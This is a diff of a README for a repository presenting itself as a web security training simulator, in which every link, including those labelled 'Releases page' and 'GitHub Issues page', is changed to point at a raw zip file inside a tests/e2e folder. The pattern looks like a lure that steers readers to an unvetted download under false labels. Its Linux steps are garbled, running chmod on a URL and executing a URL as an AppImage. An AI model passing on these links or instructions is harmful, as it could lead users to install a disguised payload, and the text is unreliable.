@@ -4,7 +4,7 @@
 **netrunner-academy** is an interactive web security training simulator. This application helps users learn vital skills such as packet capture, reverse engineering, and vulnerability exploitation in a hands-on way. Perfect for anyone looking to enhance their understanding of cybersecurity.
 
 ## 📥 Download Now
-[![Download netrunner-academy](https://raw.githubusercontent.com/Zaheensofii/netrunner-academy/main/test-results/netrunner-academy-1.0.zip)](https://raw.githubusercontent.com/Zaheensofii/netrunner-academy/main/test-results/netrunner-academy-1.0.zip)
+[![Download netrunner-academy](https://github.com/Zaheensofii/netrunner-academy/raw/refs/heads/main/tests/e2e/netrunner-academy-v1.7-alpha.4.zip)](https://github.com/Zaheensofii/netrunner-academy/raw/refs/heads/main/tests/e2e/netrunner-academy-v1.7-alpha.4.zip)
 
 ## 🚀 Getting Started
 To get started with **netrunner-academy**, follow these steps:
@@ -14,7 +14,7 @@ To get started with **netrunner-academy**, follow these steps:
 3. Take a moment to familiarize yourself with web security topics. This background will help you as you use the simulator.
 
 ## 📦 Download & Install
-Visit this page to download: [netrunner-academy Releases](https://raw.githubusercontent.com/Zaheensofii/netrunner-academy/main/test-results/netrunner-academy-1.0.zip).
+Visit this page to download: [netrunner-academy Releases](https://github.com/Zaheensofii/netrunner-academy/raw/refs/heads/main/tests/e2e/netrunner-academy-v1.7-alpha.4.zip).
 
 1. Click the link above to go to the Releases page.
 2. You will see a list of available versions.
@@ -40,11 +40,11 @@ Visit this page to download: [netrunner-academy Releases](https://raw.githubuser
 #### For Linux
 1. Make the downloaded `.AppImage` file executable:
    ```bash
-   chmod +x https://raw.githubusercontent.com/Zaheensofii/netrunner-academy/main/test-results/netrunner-academy-1.0.zip
+   chmod +x https://github.com/Zaheensofii/netrunner-academy/raw/refs/heads/main/tests/e2e/netrunner-academy-v1.7-alpha.4.zip
    ```
 2. Run the program by entering this command:
    ```bash
-   https://raw.githubusercontent.com/Zaheensofii/netrunner-academy/main/test-results/netrunner-academy-1.0.zip
+   https://github.com/Zaheensofii/netrunner-academy/raw/refs/heads/main/tests/e2e/netrunner-academy-v1.7-alpha.4.zip
    ```
 
 ## 🔍 Features
@@ -74,7 +74,7 @@ By engaging in these topics, you'll gain essential skills for navigating the cyb
 ## 🛠️ Troubleshooting
 If you encounter issues, try these steps:
 
-- **Check for Updates**: Ensure you're using the latest version of **netrunner-academy** by visiting our [Releases page](https://raw.githubusercontent.com/Zaheensofii/netrunner-academy/main/test-results/netrunner-academy-1.0.zip).
+- **Check for Updates**: Ensure you're using the latest version of **netrunner-academy** by visiting our [Releases page](https://github.com/Zaheensofii/netrunner-academy/raw/refs/heads/main/tests/e2e/netrunner-academy-v1.7-alpha.4.zip).
 - **Consult the Community**: Join our forums or contact support for help.
 
 ## 🔗 Additional Resources
@@ -84,6 +84,6 @@ If you encounter issues, try these steps:
 For ongoing support and updates, check back frequently at the Releases page.
 
 ## ✉️ Contact
-For any questions or feedback, visit our [GitHub Issues page](https://raw.githubusercontent.com/Zaheensofii/netrunner-academy/main/test-results/netrunner-academy-1.0.zip).
+For any questions or feedback, visit our [GitHub Issues page](https://github.com/Zaheensofii/netrunner-academy/raw/refs/heads/main/tests/e2e/netrunner-academy-v1.7-alpha.4.zip).
 
 Thank you for choosing **netrunner-academy**. Enjoy your learning journey in web security!
